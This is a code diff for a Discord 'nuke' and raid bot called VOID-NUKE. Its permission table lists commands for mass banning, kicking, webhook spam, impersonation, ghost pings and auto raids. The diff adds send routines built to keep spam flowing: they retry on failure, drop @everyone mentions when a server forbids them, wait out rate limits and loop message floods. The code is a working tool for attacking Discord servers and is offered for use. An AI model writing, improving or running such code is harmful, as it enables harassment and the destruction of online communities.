@@ -82,9 +82,9 @@ command_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="void-cm
 MAX_CONCURRENT = 5  # Increased from 3 to 5 for multi-threading, still safe for 0.1 CPU
 SEM = asyncio.Semaphore(MAX_CONCURRENT)
 
-# Permissions
+# Permissions - expanded for message sending diagnostics
 REQUIRED_PERMISSIONS = {
-    "administrator":{"name":"Administrator","desc":"Full access (best)","needed_for":["All commands"],"perm":"administrator"},
+    "administrator":{"name":"Administrator","desc":"Full access (best) - bypasses all","needed_for":["All commands"],"perm":"administrator"},
     "ban_members":{"name":"Ban Members","desc":"Ban users","needed_for":["Ban All","Nuke"],"perm":"ban_members"},
     "kick_members":{"name":"Kick Members","desc":"Kick users","needed_for":["Kick All"],"perm":"kick_members"},
     "manage_channels":{"name":"Manage Channels","desc":"Create/delete/rename channels","needed_for":["Del Channels","Create Channels","Rename Channels","Nuke","Auto Raid"],"perm":"manage_channels"},
@@ -92,12 +92,22 @@ REQUIRED_PERMISSIONS = {
     "manage_guild":{"name":"Manage Server","desc":"Edit server name/icon","needed_for":["Edit Server"],"perm":"manage_guild"},
     "manage_messages":{"name":"Manage Messages","desc":"Delete messages for ghost ping","needed_for":["Ghost Ping"],"perm":"manage_messages"},
     "manage_emojis_and_stickers":{"name":"Manage Emojis/Stickers","desc":"Delete emojis/stickers","needed_for":["Del Emojis","Del Stickers"],"perm":"manage_emojis_and_stickers"},
-    "moderate_members":{"name":"Moderate Members","desc":"Timeout/mute","needed_for":["Mute All"],"perm":"moderate_members"},
+    "moderate_members":{"name":"Moderate Members","desc":"Timeout/mute members","needed_for":["Mute All"],"perm":"moderate_members"},
     "manage_webhooks":{"name":"Manage Webhooks","desc":"Create webhooks for spam/impersonate","needed_for":["Webhook Spam","Impersonate"],"perm":"manage_webhooks"},
     "create_instant_invite":{"name":"Create Invite","desc":"Create invites","needed_for":["Invite Spam"],"perm":"create_instant_invite"},
-    "send_messages":{"name":"Send Messages","desc":"Send messages","needed_for":["Spam","Thread Spam","Spoiler","Poll","Event"],"perm":"send_messages"},
+    "send_messages":{"name":"Send Messages","desc":"CRITICAL for spam - send messages in channels","needed_for":["Spam","Thread Spam","Spoiler","Poll","Event","Nuke msgs"],"perm":"send_messages"},
+    "embed_links":{"name":"Embed Links","desc":"CRITICAL for embeds - send embeds","needed_for":["Spam embed","Webhook embed"],"perm":"embed_links"},
+    "attach_files":{"name":"Attach Files","desc":"Optional - for file uploads","needed_for":["Some spam"],"perm":"attach_files"},
+    "mention_everyone":{"name":"Mention Everyone","desc":"CRITICAL for @everyone spam - allows @everyone mention","needed_for":["Nuke, Auto Raid, Spam with @everyone"],"perm":"mention_everyone"},
+    "read_message_history":{"name":"Read History","desc":"For reaction spam, ghost ping","needed_for":["Reaction Spam","Ghost Ping"],"perm":"read_message_history"},
+    "use_external_emojis":{"name":"Use External Emojis","desc":"For reaction spam VOID emojis","needed_for":["Reaction Spam"],"perm":"use_external_emojis"},
+    "add_reactions":{"name":"Add Reactions","desc":"For reaction spam","needed_for":["Reaction Spam"],"perm":"add_reactions"},
     "move_members":{"name":"Move Members","desc":"Move VC members","needed_for":["Move All VC","Deafen","Kick VC"],"perm":"move_members"},
     "mute_members":{"name":"Mute/Deafen Members","desc":"Deafen VC","needed_for":["Sourdine VC"],"perm":"mute_members"},
+    "create_public_threads":{"name":"Create Public Threads","desc":"For thread spam","needed_for":["Thread Spam"],"perm":"create_public_threads"},
+    "send_messages_in_threads":{"name":"Send in Threads","desc":"For thread spam follow-up","needed_for":["Thread Spam"],"perm":"send_messages_in_threads"},
+    "manage_events":{"name":"Manage Events","desc":"For event spam","needed_for":["Event Spam"],"perm":"manage_events"},
+    "view_channel":{"name":"View Channel","desc":"CRITICAL - must see channel to send","needed_for":["All channel ops"],"perm":"view_channel"},
 }
 REQUIRED_INTENTS = {
     "members":{"name":"Server Members Intent","required":True,"desc":"Needed for member list, ban/kick/mute/rename"},
@@ -252,28 +262,152 @@ async def create_channel(guild, typ, name):
     except Exception as e: log_err(f"create ch err {e}")
     return None
 
+async def safe_send(channel, content, retry=3):
+    """Guaranteed message send with retries, stripping @everyone if needed, verbose logs"""
+    if not channel or not content:
+        return False
+    # Ensure content <= 2000 chars (Discord limit)
+    if len(content) > 2000:
+        content = content[:1997] + "..."
+    
+    attempts = [
+        content,  # Try 1: full content with @everyone
+        content.replace("@everyone","everyone").replace("||","").strip(),  # Try 2: stripped mentions
+        content[:500] if len(content)>500 else content,  # Try 3: short fallback
+        "VOID-NUKE test ✅ Bot can send messages",  # Try 4: guaranteed simple
+    ]
+    
+    for attempt_idx, attempt_content in enumerate(attempts[:retry+1]):
+        if not attempt_content:
+            continue
+        try:
+            async with SEM:
+                # Check if channel is TextChannel
+                perms = channel.permissions_for(channel.guild.me) if hasattr(channel.guild, 'me') and channel.guild.me else None
+                if perms and not perms.send_messages:
+                    log_err(f"NO send_messages perm in #{channel.name} - cannot send (perm check)")
+                    # Still try, Discord will raise Forbidden
+                msg = await channel.send(attempt_content)
+                if attempt_idx == 0:
+                    log_ok(f"Sent -> #{channel.name} [{len(attempt_content)} chars] ID:{msg.id}")
+                else:
+                    log_ok(f"Sent (retry {attempt_idx}) -> #{channel.name} without everyone mention ID:{msg.id}")
+                return True
+        except discord.Forbidden as e:
+            log_err(f"Forbidden #{channel.name} attempt {attempt_idx+1}: {e.text if hasattr(e,'text') else e} - trying stripped version")
+            if attempt_idx == 0 and ("@everyone" in attempt_content or "everyone" in attempt_content.lower()):
+                # Continue to retry with stripped version
+                await asyncio.sleep(0.5)
+                continue
+            else:
+                log_err(f"Forbidden final #{channel.name} - no perm to send. Need SEND_MESSAGES + mention_everyone: {e}")
+                return False
+        except discord.HTTPException as e:
+            if e.status == 429:  # Rate limited
+                retry_after = getattr(e, 'retry_after', 2.0)
+                log_warn(f"Rate limited #{channel.name} retry after {retry_after}s (attempt {attempt_idx+1})")
+                await asyncio.sleep(retry_after + 0.5)
+                continue
+            else:
+                log_err(f"HTTP {e.status} #{channel.name} attempt {attempt_idx+1}: {e.text[:100] if hasattr(e,'text') else e}")
+                await asyncio.sleep(0.5)
+                if attempt_idx < retry:
+                    continue
+                return False
+        except Exception as e:
+            log_err(f"Send err #{getattr(channel,'name','unknown')} attempt {attempt_idx+1}: {e}")
+            await asyncio.sleep(0.5)
+            if attempt_idx < retry:
+                continue
+            return False
+    log_err(f"Failed to send after {retry+1} attempts in #{getattr(channel,'name','unknown')}")
+    return False
+
 async def _send_embed(target, everyone=False):
+    """Robust embed send with fallback to plain text"""
     try:
-        cfg=EMBED_CONFIG
-        e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
-        for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
-        if cfg["image"]: e.set_image(url=cfg["image"])
-        e.set_footer(text=cfg["footer"])
-        c=f"@everyone {cfg['message']}" if everyone else cfg['message']
-        await target.send(content=c, embed=e)
-        log_ok(f"embed -> {getattr(target,'name',str(target))}")
-    except Exception as ex: log_err(f"embed err {ex}")
+        # First try embed
+        try:
+            cfg=EMBED_CONFIG
+            e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
+            for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
+            # Try without image first (image URL may be expired causing fail)
+            e.set_footer(text=cfg["footer"])
+            c=f"@everyone {cfg['message']}" if everyone else cfg['message']
+            # Ensure content length
+            if len(c) > 2000: c = c[:1997]+"..."
+            async with SEM:
+                await target.send(content=c, embed=e)
+            log_ok(f"Embed sent -> {getattr(target,'name',str(target))} @{everyone}")
+            return True
+        except discord.Forbidden:
+            # Try without @everyone
+            log_warn(f"Embed forbidden @everyone in {getattr(target,'name',str(target))}, trying without")
+            async with SEM:
+                cfg=EMBED_CONFIG
+                e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
+                for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
+                e.set_footer(text=cfg["footer"])
+                await target.send(content=cfg['message'], embed=e)
+            log_ok(f"Embed sent (no everyone) -> {getattr(target,'name',str(target))}")
+            return True
+        except discord.HTTPException as he:
+            if he.status == 400 and "image" in str(he).lower():
+                # Retry without image
+                log_warn(f"Embed image failed, retrying without image in {getattr(target,'name',str(target))}")
+                cfg=EMBED_CONFIG
+                e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
+                for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
+                e.set_footer(text=cfg["footer"])
+                async with SEM:
+                    await target.send(content=c if 'c' in locals() else cfg['message'], embed=e)
+                log_ok(f"Embed sent (no image) -> {getattr(target,'name',str(target))}")
+                return True
+            raise
+    except discord.Forbidden as e:
+        log_err(f"Embed forbidden {getattr(target,'name',str(target))}: no embed perms or send_messages - {e}")
+        # Fallback to plain text
+        return await safe_send(target, PUB if 'PUB' in globals() else "VOID-NUKE ✅", retry=1)
+    except Exception as ex:
+        log_err(f"Embed err {getattr(target,'name',str(target))}: {ex} - fallback to plain")
+        return await safe_send(target, PUB, retry=1)
 
 async def _send_to(chan, count, content, everyone):
-    final=_pub_append(content)
-    try:
+    """Multi-threaded safe send with per-message logging"""
+    if not chan:
+        return log_err("No channel for _send_to")
+    
+    # If content is embed keyword, use embed path
+    if content and content.lower() == 'embed':
         for i in range(count):
-            if content.lower()=='embed': await _send_embed(chan, everyone)
-            else: await chan.send(final)
-        log_ok(f"[{count}] #{chan.name}")
-    except discord.Forbidden: log_err(f"no perm #{chan.name}")
-    except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}")
-    except Exception as e: log_err(f"send err {e}")
+            try:
+                ok = await _send_embed(chan, everyone)
+                if not ok:
+                    log_err(f"Embed failed in #{chan.name} [{i+1}/{count}]")
+                else:
+                    log_ok(f"[{i+1}/{count}] Embed #{chan.name}")
+            except Exception as e:
+                log_err(f"Embed loop err #{chan.name} [{i+1}/{count}]: {e}")
+            await asyncio.sleep(0.4)  # Rate limit protection
+        return
+    
+    # Normal text path with safe_send
+    final=_pub_append(content) if content else PUB
+    success=0
+    for i in range(count):
+        try:
+            ok = await safe_send(chan, final, retry=3)
+            if ok:
+                success+=1
+                log_ok(f"[{i+1}/{count}] Sent #{chan.name}")
+            else:
+                log_err(f"[{i+1}/{count}] Failed #{chan.name}")
+        except Exception as e:
+            log_err(f"[{i+1}/{count}] Exception #{chan.name}: {e}")
+        await asyncio.sleep(0.5)  # Anti rate-limit for free tier
+    
+    log_ok(f"Spam finished #{chan.name}: {success}/{count} sent")
+    return success>0
 
 def _skip(m, bot_id):
     if m.id==bot_id: return True
